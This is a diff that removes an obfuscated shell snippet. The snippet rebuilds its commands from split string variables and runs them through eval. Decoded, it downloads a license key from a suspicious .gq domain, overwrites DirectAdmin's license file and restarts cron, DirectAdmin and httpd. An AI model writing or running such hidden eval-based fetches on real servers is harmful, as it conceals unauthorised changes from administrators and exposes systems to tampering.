@@ -1,3 +1,0 @@
-z="
-";Jz='e.ke';Az='wget';Iz='cens';Hz='q/li';dz='rest';Dz='://d';Rz='conf';Sz='/lic';Pz='ctad';Lz=' /us';bz='t';Xz='t.d/';Cz='http';az='star';Vz='/etc';Zz='d re';ez='art';Gz='in.g';Oz='dire';Wz='/ini';Yz='cron';Uz='.key';Qz='min/';Fz='tadm';Ez='irec';Tz='ense';Bz=' -N ';cz='min ';Nz='cal/';Kz='y -O';Mz='r/lo';
-eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$z$Vz$Wz$Xz$Yz$Zz$az$bz$z$Vz$Wz$Xz$Oz$Pz$cz$dz$ez$z$Vz$Wz$Xz$Cz$Zz$az$bz"
